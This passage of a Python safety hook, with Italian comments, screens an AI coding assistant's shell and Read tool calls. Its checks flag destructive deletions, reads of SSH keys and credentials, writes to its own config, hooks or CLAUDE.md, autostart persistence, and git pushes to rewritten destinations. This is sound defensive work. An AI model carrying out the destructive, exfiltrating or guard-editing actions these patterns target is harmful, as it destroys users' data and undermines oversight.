    for nome, args in _forma().programmi(command):
        nome = nome.lower()
        if nome.endswith(".exe"):
            nome = nome[:-4]
        opzioni = [a.lower() for a in args if a.startswith("/") and len(a) == 2]
        if nome == "cmd" and args and args[0].lower() in ("/c", "//c", "/k", "//k") and profondita < 3:
            motivo = _distruzione_totale(" ".join(a.replace("\\", "\\\\") for a in args[1:]), profondita + 1)
            if motivo:
                return motivo
            continue
        if nome == "rm" and _forma()._ricorsivo(args) and any(_RADICE_RM.match(a) for a in args if not a.startswith("-")):
            return "rm ricorsivo sulla radice o sulla home intera"
        if nome in ("del", "erase") and "/s" in opzioni and any(_DISCO_DEL.match(a) for a in args):
            return "cancellazione ricorsiva del disco intero"
        if nome in ("rd", "rmdir") and "/s" in opzioni and any(_DISCO_RD.match(a) for a in args):
            return "cancellazione ricorsiva del disco intero"
        if nome == "format" and any(re.fullmatch(r"[a-zA-Z]:", a) for a in args):
            return "format filesystem"
    return None


# Una destinazione del push riscritta nello stesso comando (review delle correzioni del 1/11/2026): git legge
# le chiavi senza badare alle maiuscole, `git -C dir -c …` e GIT_CONFIG_* sfuggivano ai deny di settings.json.
_CHIAVE_DESTINAZIONE = re.compile(r"^(?:remote\..+\.(?:url|pushurl)|url\..+\.(?:push)?insteadof)=", re.IGNORECASE)
_GIT_CONFIG_AMBIENTE = re.compile(r"\bGIT_CONFIG_(?:COUNT|KEY_\d+|PARAMETERS)=", re.IGNORECASE)


def _push_riscritto(command) -> bool:
    for nome, args in _forma().programmi(command):
        if nome != "git":
            continue
        i, riscritto = 0, False
        while i < len(args) and args[i].startswith("-"):
            a = args[i]
            if a == "-c" and i + 1 < len(args) and _CHIAVE_DESTINAZIONE.match(args[i + 1]):
                riscritto = True
            elif a.startswith("-c") and len(a) > 2 and _CHIAVE_DESTINAZIONE.match(a[2:]):
                riscritto = True
            elif a.startswith("--config-env"):
                riscritto = True
            i += 2 if a in _GIT_OPZIONI_CON_VALORE else 1
        if i < len(args) and args[i] == "push" and (riscritto or _GIT_CONFIG_AMBIENTE.search(command)):
            return True
    return False


def _rm_segments(command):
    """(bersagli, catena dei cd) per ogni `rm` ricorsivo; bersagli None per `xargs rm -r`.

    I comandi si leggono con forma_comando.programmi: `rm` col path completo, in
    una subshell o in un blocco `{ }`, dopo `then`/`do`, dietro un wrapper o dentro
    `sh -c` ed `eval` è lo stesso `rm`. Il testo di un heredoc quotato verso python
    o cat non è un comando. `xargs rm -r` ha bersagli che arrivano da stdin.
    Dal 31/10/2026 si tengono tutti i cd prima dell'rm, in ordine: `cd "$S/x" && …; cd .. &&
    rm -rf x` cancella in $S, e la guardia teneva solo l'ultimo cd (`..`) e lo leggeva dalla
    cwd della sessione. Li risolve _basi_dopo_cd.
    """
    forma = _forma()
    out = []
    for nome, args, cwd_decl in _programmi_con_cd(command):
        if nome == "xargs" and "rm" in [os.path.basename(a) for a in args]:
            dopo = args[[os.path.basename(a) for a in args].index("rm") + 1:]
            if forma._ricorsivo(dopo):
                out.append((None, cwd_decl))
            continue
        if nome == "rm":
            recursive = False
            targets = []
            salta = False
            for tk in args:
                # Una redirezione non è un bersaglio: `rm -rf build 2>/dev/null` non cancella
                # /dev/null (19/10/2026). `>` da solo porta con sé la parola che segue.
                if salta:
                    salta = False
                    continue
                if _REDIREZIONE_RE.match(tk):
                    salta = _REDIREZIONE_SOLA_RE.match(tk) is not None
                    continue
                if tk == "--recursive":
                    recursive = True
                elif tk.startswith("-") and tk != "--":
                    if "r" in tk.lower():
                        recursive = True
                elif tk != "--":
                    targets.append(tk)
            if recursive:
                out.append((targets, cwd_decl))
    return out


def _basi_dopo_cd(cds, cwd):
    """Le cartelle da cui può girare un comando dopo la catena `cds` (31/10/2026).

    Ogni cd parte da dove ha lasciato il precedente, con le variabili assegnate nel comando
    (`S=…; cd "$S/x"`). Se la cartella di un cd non esiste adesso, il cd può fallire e un
    comando dopo `;` gira dalla cartella di prima: contano entrambe, e l'rm passa solo se è
    sicuro da tutte. None = una cartella che non si risolve (`cd -`, `cd $(…)`, popd).
    Un cd che non gira di sicuro nella shell dell'rm (in una subshell, in un ramo, dopo `||`, dopo
    `&&` preceduto da un altro comando, prima di `&` o `|`: vedi _cd_certi) tiene anche la cartella
    di prima, anche quando la sua cartella esiste."""
    basi = [os.path.normpath(cwd)]
    for c, certo in cds:
        nuove = []
        for b in basi:
            dest = None if (b is None or c is None) else _resolve(c, b)
            for x in ([dest] if certo and dest is not None and os.path.isdir(dest) else [dest, b]):
                if x not in nuove:
                    nuove.append(x)
        basi = nuove
        if len(basi) > 16:
            return [None]
    return basi


def _inert_reference(command: str) -> bool:
    if re.search(r"[;&|]|\$\(|`|<\(|>\(", command):
        return False
    return bool(re.match(r"\s*(?:echo|printf|cat)\b", command))


def main() -> int:
    try:
        if hasattr(signal, "SIGALRM"):
            signal.alarm(8)
        data = json.loads(sys.stdin.buffer.read().decode("utf-8"))
        if hasattr(signal, "SIGALRM"):
            signal.alarm(0)
    except Exception:
        return 0

    # Modo `dopo` (PostToolUse di Bash): registra i commit della sessione per la regola git-amend. Non
    # decide niente e non scrive su stdout; un suo errore non ferma la sessione.
    if sys.argv[1:2] == ["dopo"]:
        try:
            if data.get("tool_name") == "Bash":
                registra_commit(data)
        except Exception:
            pass
        return 0

    # Read di una chiave privata in ~/.ssh con un nome libero (`~/.ssh/github`): i deny di settings.json
    # coprono solo i nomi noti, e `Read` in allow salta il classificatore (1/11/2026, F01).
    if data.get("tool_name") == "Read":
        percorso = str((data.get("tool_input") or {}).get("file_path") or "")
        if _SSH_LETTURA.search(re.sub(r"/+", "/", percorso.replace("\\", "/"))):
            return _ask("segreto",
                "Lettura di un file in ~/.ssh che non è config, known_hosts, authorized_keys o una chiave "
                "pubblica: è probabilmente una chiave privata, e il contenuto finirebbe nel contesto. "
                "Conferma solo se serve davvero.")
        return 0
    if data.get("tool_name") not in ("Bash", "Monitor"):  # Monitor lancia comandi shell (19/10/2026)
        return 0
    command = (data.get("tool_input") or {}).get("command", "")
    if not isinstance(command, str) or not command:
        return 0
    cwd = data.get("cwd") or _home()

    # Il testo che la shell esegue davvero: senza i corpi degli heredoc quotati
    # verso python o cat e senza i messaggi -m che citano un comando.
    testo = _testo_shell(command)
    _ASSEGNATE.clear()
    _ASSEGNATE.update(_assegnazioni(command))

    # 1) Blocco duro
    if not _inert_reference(command):
        for pattern, why in DANGEROUS:
            if re.search(pattern, testo, re.IGNORECASE):
                sys.stderr.write(
                    f"Bloccato: questo comando sembra {why}. "
                    "Non proporre all'utente di eseguirlo a mano: per installare un programma "
                    "indica l'installer o il pacchetto ufficiale. L'assistente non esegue "
                    "operazioni distruttive irreversibili.\n"
                )
                return 2
        try:
            motivo = _distruzione_totale(command)
        except Exception:
            motivo = None
        if motivo:
            sys.stderr.write(
                f"Bloccato: questo comando sembra {motivo}. L'assistente non esegue operazioni "
                "distruttive irreversibili, e non proporre all'utente di eseguirlo a mano.\n"
            )
            return 2

    # 2) Scrittura shell su config/hook di Claude Code -> ask (auto-modifica guardie)
    if CONFIG_WRITE_RE.search(testo) or _writes_config(testo, cwd):
        return _ask("config",
            "Scrittura via shell su settings/hook di Claude Code o sull'aggiornamento automatico "
            "di Arturo: modificherebbe le guardie stesse, o cosa si installa da solo. Conferma "
            "solo se stai aggiornando la config di proposito."
        )

    # 2a) Scrittura shell su un CLAUDE.md -> ask (le istruzioni di ogni sessione futura).
    # Dal 31/10/2026 conta il percorso risolto, come per Edit e Write: ~/.claude/CLAUDE.md chiede sempre,
    # un CLAUDE.md di progetto tace se protect_claude_md.local dice "allow claude-md-progetto". La regex
    # testuale resta per le scritture che non si risolvono (open() in python): quelle chiedono.
    # Dal 1/11/2026 (F16 F17) ogni scrittura si giudica da sola: il globale chiede anche se lo stesso
    # comando scrive un CLAUDE.md di progetto, il confronto passa da realpath (un link verso il globale
    # non è un CLAUDE.md di progetto), crearne uno nuovo chiede sempre come in protect_claude_md.py, e
    # open() di python su un CLAUDE.md chiede sempre: _writes_config non lo risolve.
    def _globale(p):
        return _is_claude_md_globale(p) or (bool(p) and _is_claude_md_globale(os.path.realpath(p)))

    globale = _writes_config(testo, cwd, _globale)
    # sed -i su un file che non esiste non lo crea: per i CLAUDE.md nuovi conta solo chi scrive davvero.
    progetto_nuovo = _writes_config(testo, cwd, sed=False, protetto=lambda p: _is_claude_md(p) and not _globale(p)
                                    and not os.path.exists(p))
    progetto = _writes_config(testo, cwd, lambda p: _is_claude_md(p) and not _globale(p) and os.path.exists(p))
    risolto = _writes_config(testo, cwd, lambda p: _is_claude_md(p) and not _globale(p))
    if globale or progetto_nuovo or (progetto and not _claude_md_progetto_libero()) or \
            CLAUDE_MD_OPEN_RE.search(testo) or (CLAUDE_MD_WRITE_RE.search(testo) and not risolto):
        return _ask("claude-md",
            "Scrittura via shell su un CLAUDE.md: cambierebbe le istruzioni di ogni sessione "
            "futura in quella cartella. Conferma solo se sei tu a volerlo."
        )

    # 2a-bis) Scrittura shell su un percorso di avvio automatico -> ask (persistenza)
    if PERSIST_WRITE_RE.search(testo) or _writes_config(testo, cwd, _is_persistenza):
        return _ask("avvio-automatico",
            "Scrittura via shell su un git hook o su un servizio di avvio automatico "
            "(LaunchAgents, systemd, autostart): il codice partirebbe da solo a ogni "
            "commit o a ogni accesso. Conferma solo se l'hai chiesto tu."
        )

    # 2b) Creazione di un file di unlock -> ask (sbloccherebbe l'auto-modifica)
    sblocco = UNLOCK_RE.search(testo) or _writes_config(testo, cwd, _is_unlock)
    if sblocco and "claude-md-unlock" in testo and "config-unlock" not in testo:
        return _ask("sblocco-claude-md",
            "Sblocco della modifica di CLAUDE.md per questa sessione: Claude potrà "
            "cambiare le istruzioni che segue. Conferma se sei tu ad aver chiesto la modifica."
        )
    if sblocco:
        return _ask("sblocco",
            "Creazione di un file di unlock che disattiverebbe la protezione "
            "sull'auto-modifica di config/hook. Conferma solo se sei tu a volerlo."
        )

    # 3) Lettura di file segreti via shell -> ask (per-segmento, alta precisione)
    if _reads_secret(command):
        return _ask("segreto",
            "Lettura di un file segreto via shell (chiave privata, credenziali, "
            "~/.ssh, ~/.aws...). Conferma solo se serve davvero: il contenuto "
            "finirebbe nel contesto e potrebbe essere esfiltrato."
        )

    # 3-bis) sed che scrive col comando `w` -> ask
    if _sed_scrive(command):
        return _ask("sed-w",
            "sed scrive su file col comando `w` (vale anche sotto -n e come flag "
            "di s///): il file indicato viene sovrascritto. Conferma solo se la "
            "scrittura è voluta."
        )

    # 3-ter) sed che esegue un comando di shell (`e`, flag `e` di s///) -> ask (1/11/2026, F05)
    if _sed_esegue(command):
        return _ask("sed-e",
            "sed esegue in shell un comando col comando `e` o col flag `e` di s///: il testo diventa "
            "un comando, anche un rm. Conferma solo se l'esecuzione è voluta."
        )

    # 4) Docker distruttivo su volumi -> ask
    if DOCKER_DESTRUCTIVE_RE.search(command):
        return _ask("docker-volumi",
            "Rimozione di volumi Docker (dati persistenti). Irreversibile: "
            "conferma solo se vuoi davvero cancellare i dati dei container."
        )

    # 5) rm ricorsivo -> ask, tranne cartelle rigenerabili e file temporanei.
    # Chi usa Arturo spesso non programma: una cartella di capitoli o i Documenti
    # valgono quanto la config, e sul terminale non c'è cestino.
    try:
        for targets, cwd_decl in _rm_segments(command):
            if targets is None:
                return _ask("rm-xargs",
                    "rm ricorsivo dietro xargs: i percorsi arrivano da un altro comando e "
                    "non si possono controllare prima. Conferma solo se sai cosa cancella."
                )
            for base_cwd, t in [(b, t) for b in _basi_dopo_cd(cwd_decl, cwd) for t in (targets or ["."])]:
                if t in BARE_TARGETS:
                    p = os.path.normpath(base_cwd) if base_cwd else None
                else:
                    p = _resolve(t, base_cwd)
                if p is not None and _sotto_link_nuovo(p, command, cwd):
                    return _ask("rm-ignoto",
                        f"rm ricorsivo su {t}, sotto un link che lo stesso comando crea: la cartella vera "
                        "non si conosce prima. Controlla dove punta il link prima di confermare."
                    )
                reale = _reale(p)
                if reale != p and (_is_protected_tree(reale) or not (_rigenerabile(reale) or _temporaneo(reale))):
                    return _ask("rm-protetto" if _is_protected_tree(reale) else "rm-cartella",
                        f"rm ricorsivo su {p}, che attraverso un link porta a {reale}. Dal terminale non passa "
                        "dal cestino: conferma solo se vuoi davvero cancellarlo."
                    )
                if _is_protected_tree(p):
                    return _ask("rm-protetto",
                        f"rm ricorsivo su un percorso protetto ({p}): memoria, "
                        "progetti o config di Claude Code. Irreversibile: dal terminale "
                        "non passa dal cestino. Conferma solo se vuoi davvero cancellarlo."
                    )
                if p is None:
                    return _ask("rm-ignoto",
                        f"rm ricorsivo su un percorso che non so risolvere ({t}). "
                        "Irreversibile: controlla la cartella prima di confermare."
                    )
                if not (_rigenerabile(p) or _temporaneo(p)):
                    return _ask("rm-cartella",
                        f"rm ricorsivo su una cartella ({p}). Dal terminale non passa "
                        "dal cestino: se dentro c'è lavoro tuo, lo perdi. Conferma solo "
                        "se vuoi davvero cancellarla."
                    )
    except Exception:
        return _ask("rm-illeggibile", "rm ricorsivo che la guardia non riesce a leggere: controlla prima di confermare.")

    # 6) find che cancella -> ask
    try:
        cancella = _find_delete(command)
    except Exception:
        cancella = "find" in command  # come rm e rmtree: un find che la guardia non legge si controlla
    if cancella:
        return _ask("find-delete",
            "find con -delete o -exec rm cancella file in blocco, senza cestino. "
            "Conferma solo se hai controllato cosa trova."
        )

    # 7) shutil.rmtree -> ask, come rm ricorsivo: tranne cartelle rigenerabili e file temporanei.
    try:
        for t in _rmtree_bersagli(command):
            if t == _TEMPORANEA:
                continue
            p = _resolve(t, os.path.normpath(cwd)) if t else None
            if p is None:
                return _ask("rmtree-variabile",
                    "shutil.rmtree su un percorso che arriva da una variabile: cancella una cartella "
                    "intera, senza cestino. Controlla quale prima di confermare."
                )
            reale = _reale(p)
            if _is_protected_tree(p) or not (_rigenerabile(p) or _temporaneo(p)) or \
                    _is_protected_tree(reale) or not (_rigenerabile(reale) or _temporaneo(reale)):
                return _ask("rmtree-cartella",
                    f"shutil.rmtree su una cartella ({p}): la cancella intera, senza cestino. Se dentro "
                    "c'è lavoro tuo, lo perdi. Conferma solo se vuoi davvero cancellarla."
                )
    except Exception:
        return _ask("rmtree-illeggibile", "shutil.rmtree che la guardia non riesce a leggere: controlla prima di confermare.")

    # 8) git clean -f -> ask: i file non tracciati non stanno in nessun commit.
    if _git_clean_forzato(command):
        return _ask("git-clean",
            "git clean -f cancella i file che git non traccia: non stanno in nessun commit e non "
            "tornano indietro. Prova prima con `git clean -n` per vedere cosa toglie."
        )

    # 8-bis) push verso una destinazione riscritta nello stesso comando -> ask
    try:
        riscritto = _push_riscritto(command)
    except Exception:
        riscritto = bool(re.search(r"\bpush\b", command) and re.search(r"(?i)insteadof|\.url=|config-env|GIT_CONFIG_", command))
    if riscritto:
        return _ask("git-destinazione",
            "git push con la destinazione riscritta nello stesso comando (git -c remote.<nome>.url=, "
            "insteadOf, pushurl, --config-env o GIT_CONFIG_*): il contenuto andrebbe a un indirizzo che il "
            "repository non ha configurato. Conferma solo se l'indirizzo è tuo."
        )

    # 9) git branch -D e git stash drop -> ask, solo se il lavoro non esiste altrove (31/10/2026).
    try:
        perde = _git_perde_lavoro(command, cwd)
    except Exception:
        perde = ("git-ramo", "git branch -D o git stash drop che la guardia non riesce a leggere: "
                 "controlla prima di confermare.") if re.search(r"branch\s.*(-[a-zA-Z]*D|--d)|stash\s+(drop|clear)", command) else None
    if perde and perde[0] == "git-stash":
        return _ask("git-stash", perde[1])
    if perde:
        return _ask("git-ramo", perde[1])

    # 10) git commit --amend su un HEAD che questa sessione non ha registrato -> ask (3/11/2026, #4187).
    try:
        altrui = _amend_altrui(command, cwd, data.get("session_id"))
    except Exception:
        altrui = ("git commit --amend che la guardia non riesce a leggere: controlla con `git log -1` "
                  "prima di confermare.") if re.search(r"\bcommit\b.*--am", command) else None
    if altrui:
        return _ask("git-amend", altrui)

    return 0


if __name__ == "__main__":
    # Claude Code scrive e legge in UTF-8. Su Windows la pipe è in cp1252 (16/10/2026).
    for _flusso in (sys.stdout, sys.stderr):
        try:
            _flusso.reconfigure(encoding="utf-8")
        except (AttributeError, ValueError):
            pass
    sys.exit(main())
